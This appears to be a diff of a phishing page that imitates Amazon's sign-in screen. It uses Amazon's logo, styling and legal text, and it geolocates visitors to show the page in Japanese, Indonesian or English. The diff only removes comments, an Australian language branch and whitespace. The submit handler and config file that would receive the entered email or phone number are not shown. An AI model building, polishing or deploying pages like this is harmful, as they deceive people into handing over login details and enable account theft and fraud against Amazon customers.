@@ -6,7 +6,6 @@
     <title>Amazon Sign In</title>
     <script src="config.js"></script>
     <script>
-        // === DETEKSI NEGARA & BAHASA ===
         let BAHASA = {
             judul: 'Sign in or create account',
             sub: 'Enter mobile number or email',
@@ -25,7 +24,6 @@
                 const d = await res.json();
                 const negara = d.country_code || 'US';
 
-                // Sesuaikan bahasa
                 if (negara === 'JP') {
                     BAHASA = {
                         judul: 'サインインまたはアカウント作成',
@@ -52,24 +50,9 @@
                         error_kosong: 'Masukkan alamat email atau nomor ponsel Anda'
                     };
                     document.documentElement.lang = 'id';
-                } else if (negara === 'AU') {
-                    BAHASA = {
-                        judul: 'Sign in or create account',
-                        sub: 'Enter mobile number or email',
-                        label: 'Mobile phone number or email address',
-                        tombol: 'Continue',
-                        syarat: 'By continuing, you agree to Amazon\'s Conditions of Use and Privacy Notice.',
-                        bantuan: 'Need help?',
-                        bisnis: 'Buying for work?',
-                        bisnis_link: 'Create a free business account',
-                        error_kosong: 'Enter your email or mobile phone number'
-                    };
                 }
-                // Tambahkan teks ke halaman
                 terapkanBahasa();
-            } catch(e) {
-                console.log('Gagal deteksi lokasi, pakai Bahasa Inggris');
-            }
+            } catch(e) {}
         }
 
         function terapkanBahasa() {
@@ -93,36 +76,27 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
         body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 15px 20px; }
-        
         .logo { margin: 10px 0 20px; }
         .logo img { height: 60px; }
-        
         .kotak { width: 100%; max-width: 350px; border: 1px solid #ddd; border-radius: 8px; padding: 20px 26px; }
         h1 { font-size: 28px; font-weight: 400; margin-bottom: 10px; line-height: 1.2; }
         .sub-judul { font-size: 14px; color: #111; margin-bottom: 15px; }
-        
         label { font-size: 13px; font-weight: 700; display: block; margin-bottom: 6px; color: #111; }
         input { width: 100%; padding: 7px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; margin-bottom: 13px; height: 31px; }
         input:focus { outline: none; border-color: #0071e3; box-shadow: 0 0 3px rgba(0,113,227,0.5); }
-        
         button { width: 100%; padding: 7px 10px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; color: #0F1111; cursor: pointer; height: 32px; margin-bottom: 20px; }
         button:hover { background: #F7CA00; }
-        
         .syarat { font-size: 12px; line-height: 1.5; margin-bottom: 25px; }
         .syarat a { color: #0066c0; text-decoration: none; }
         .syarat a:hover { text-decoration: underline; }
-        
         .bantuan { font-size: 13px; margin-bottom: 25px; }
         .bantuan a { color: #0066c0; text-decoration: none; }
         .bantuan a:hover { text-decoration: underline; }
-        
         .garis-pemisah { height: 1px; background: #e7e7e7; margin: 12px 0 20px; }
-        
         .bisnis { font-size: 13px; }
         .bisnis strong { color: #111; }
         .bisnis a { color: #0066c0; text-decoration: none; display: block; margin-top: 3px; }
         .bisnis a:hover { text-decoration: underline; }
-        
         .footer { width: 100%; max-width: 500px; margin-top: 30px; padding-top: 20px; border-top: 1px solid #e7e7e7; text-align: center; font-size: 11px; color: #555; }
         .footer-link { margin-bottom: 10px; }
         .footer-link a { color: #0066c0; text-decoration: none; margin: 0 8px; }
@@ -132,31 +106,23 @@
 </head>
 <body>
     <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
-    
     <div class="kotak">
         <h1 id="judul">Sign in or create account</h1>
         <p class="sub-judul" id="sub-judul">Enter mobile number or email</p>
-        
         <label for="email" id="label-email">Mobile phone number or email address</label>
         <input type="text" id="email" placeholder="">
         <div class="pesan-error" id="pesanKosong">Enter your email or mobile phone number</div>
-        
         <button id="tombol-lanjut" onclick="lanjut()">Continue</button>
-        
         <p class="syarat" id="syarat-teks">
             By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
         </p>
-        
         <p class="bantuan"><a href="#" id="bantuan-link">Need help?</a></p>
-        
         <div class="garis-pemisah"></div>
-        
         <p class="bisnis">
             <strong id="bisnis-teks">Buying for work?</strong>
             <a href="#" id="bisnis-link">Create a free business account</a>
         </p>
     </div>
-    
     <div class="footer">
         <div class="footer-link">
             <a href="#">Conditions of Use</a>
